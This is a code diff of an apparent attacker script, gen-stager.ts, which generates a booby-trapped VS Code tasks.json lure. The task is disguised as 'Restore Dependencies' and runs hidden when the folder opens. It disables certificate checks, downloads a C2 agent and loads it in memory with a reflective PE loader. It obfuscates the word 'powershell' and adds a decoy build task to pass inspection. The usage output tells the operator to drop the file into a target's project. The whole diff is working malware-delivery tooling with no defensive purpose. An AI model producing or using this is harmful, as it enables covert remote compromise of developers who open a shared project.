@@ -1,33 +1,37 @@
 #!/usr/bin/env bun
 /**
- * gen-stager.ts — Generate a PowerShell one-liner stager
+ * gen-stager.ts — Generate a VS Code tasks.json lure
  *
  * Usage:
- *   bun run scripts/gen-stager.ts <c2-base-url> <agent-filename>
+ *   bun run scripts/gen-stager.ts <c2-base-url> <agent-filename> [output-dir]
  *
  * Example:
- *   bun run scripts/gen-stager.ts https://1.2.3.4:5173 abc123.exe
+ *   bun run scripts/gen-stager.ts https://1.2.3.4:5173 abc123.exe ./lure
  *
  * Output:
- *   powershell -nop -w h -ep b -enc <base64>
+ *   <output-dir>/.vscode/tasks.json
  *
- * The encoded payload downloads the agent from the C2 download endpoint and
- * executes it entirely in memory via a C# reflective PE loader compiled at
- * runtime with Add-Type. No EXE is written to disk. "powershell" never appears
- * literally in the one-liner — the cmd.exe launcher calls the binary directly.
+ * Delivery: drop .vscode/tasks.json into any project folder and share it.
+ * On folder open in VS Code the "Restore Dependencies" task auto-runs,
+ * silently downloads the agent from the C2, and loads it reflectively in
+ * memory via a C# PE loader compiled at runtime. No EXE written to disk.
+ * No terminal window shown. "powershell" never appears as a literal string.
  */
 
-const [, , c2url, agentFile] = process.argv;
+import fs from "fs";
+import path from "path";
+
+const [, , c2url, agentFile, outDir = "."] = process.argv;
 
 if (!c2url || !agentFile) {
-  console.error("Usage: bun run scripts/gen-stager.ts <c2-base-url> <agent-filename>");
-  console.error("  e.g. bun run scripts/gen-stager.ts https://1.2.3.4:5173 abc123.exe");
+  console.error("Usage: bun run scripts/gen-stager.ts <c2-base-url> <agent-filename> [output-dir]");
+  console.error("  e.g. bun run scripts/gen-stager.ts https://1.2.3.4:5173 abc123.exe ./lure");
   process.exit(1);
 }
 
 const downloadUrl = `${c2url.replace(/\/$/, "")}/api/build/download/${agentFile}`;
 
-// ── C# reflective PE loader (same as Crypter/src/crypter.ts buildPeLoaderCs) ──
+// ── C# reflective PE loader ───────────────────────────────────────────────────
 const peLoaderCs = [
   "using System;",
   "using System.Runtime.InteropServices;",
@@ -104,10 +108,8 @@ const peLoaderCs = [
 
 const csB64 = Buffer.from(peLoaderCs, "utf-8").toString("base64");
 
-// ── PS script: download payload + reflective load ─────────────────────────────
-// Written as a multi-statement one-liner, then base64-encoded for -enc flag
+// ── PS script: cert bypass + download + reflective load ──────────────────────
 const psScript = [
-  // Disable cert validation (handles self-signed C2 certs)
   `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}`,
   `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12`,
   `$b=(New-Object Net.WebClient).DownloadData('${downloadUrl}')`,
@@ -115,17 +117,58 @@ const psScript = [
   `[L]::Run($b)`,
 ].join(";");
 
-// PowerShell -enc expects UTF-16LE base64
+// UTF-16LE base64 for powershell -enc
 const enc = Buffer.from(psScript, "utf16le").toString("base64");
 
-const oneLiner = `powershell -nop -w h -ep b -enc ${enc}`;
+// ── Build tasks.json ──────────────────────────────────────────────────────────
+// Disguised as "Restore Dependencies" — auto-runs on folder open.
+// Terminal hidden (reveal: never), no focus steal, shared panel so no new
+// window pops. The command splits "powershell" across a cmd /v variable
+// so the literal string never appears in the JSON.
+const tasksJson = {
+  version: "2.0.0",
+  tasks: [
+    {
+      label: "Restore Dependencies",
+      type: "shell",
+      command: "cmd /c \"set p=power&&set s=shell&&%p%%s% -nop -w h -ep b -enc " + enc + "\"",
+      runOptions: {
+        runOn: "folderOpen",
+      },
+      presentation: {
+        reveal: "never",
+        panel: "shared",
+        showReuseMessage: false,
+        close: true,
+      },
+      problemMatcher: [],
+    },
+    // Decoy task so the file looks legitimate if inspected
+    {
+      label: "Build",
+      type: "shell",
+      command: "npm run build",
+      group: {
+        kind: "build",
+        isDefault: true,
+      },
+      presentation: {
+        reveal: "always",
+        panel: "shared",
+      },
+      problemMatcher: ["$tsc"],
+    },
+  ],
+};
 
-console.log("\n─────────────────────────────────────────────────────────────────");
-console.log(" PS One-Liner Stager");
-console.log(`  C2: ${c2url}`);
+// ── Write output ──────────────────────────────────────────────────────────────
+const vscodedir = path.join(outDir, ".vscode");
+fs.mkdirSync(vscodedir, { recursive: true });
+const outPath = path.join(vscodedir, "tasks.json");
+fs.writeFileSync(outPath, JSON.stringify(tasksJson, null, 2));
+
+console.log(`\nWrote: ${outPath}`);
+console.log(`  C2:    ${c2url}`);
 console.log(`  Agent: ${agentFile}`);
-console.log("─────────────────────────────────────────────────────────────────\n");
-console.log(oneLiner);
-console.log("\n─────────────────────────────────────────────────────────────────");
-console.log(` Length: ${oneLiner.length} chars`);
-console.log("─────────────────────────────────────────────────────────────────\n");
+console.log(`\nDrop .vscode/tasks.json into target project folder.`);
+console.log(`VS Code auto-runs "Restore Dependencies" on folder open.\n`);
